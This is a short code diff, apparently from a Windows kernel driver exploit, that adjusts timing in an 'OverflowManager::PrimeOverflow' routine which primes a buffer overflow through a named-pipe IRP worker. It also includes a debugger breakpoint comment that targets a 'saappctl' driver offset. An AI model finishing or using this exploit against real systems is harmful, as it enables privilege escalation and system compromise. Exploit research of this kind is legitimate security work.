@@ -1,6 +1,13 @@
 #include "general.h"
 
-#define OVERFLOW_IRP_WAIT_MS 20
+#include "config.h"
+
+#ifndef OVERFLOW_IRP_WAIT_MS
+#define OVERFLOW_IRP_WAIT_MS 120
+#endif
+#ifndef OVERFLOW_IRP_SECOND_WAIT_MS
+#define OVERFLOW_IRP_SECOND_WAIT_MS 80
+#endif
 
 //bp saappctl+0x02F454".if (qwo(@rbx + 4) == 0x6161616161616161) { dc rbx-4 L 50} .else { gc }"
 
@@ -63,7 +70,19 @@ void OverflowManager::PrimeOverflow(UINT64 tChunkSize) {
             return;
         }
         else if (waitResult == WAIT_TIMEOUT) {
-            DEBUG_PRINT(" [!] Timed out waiting for overflow IRP worker; continuing cautiously\n");
+            waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, OVERFLOW_IRP_SECOND_WAIT_MS);
+            if (waitResult == WAIT_OBJECT_0 + 1) {
+                DEBUG_PRINT(" [!] Overflow IRP worker failed to open pipe handle after second wait\n");
+                DisconnectNamedPipe(sPipe);
+                CloseHandle(sPipe);
+                LocalFree(securityDescriptor);
+                if (irpThread.joinable())
+                    irpThread.join();
+                return;
+            }
+            else if (waitResult == WAIT_TIMEOUT) {
+                DEBUG_PRINT(" [!] Timed out waiting for overflow IRP worker; continuing cautiously\n");
+            }
         }
     }
 
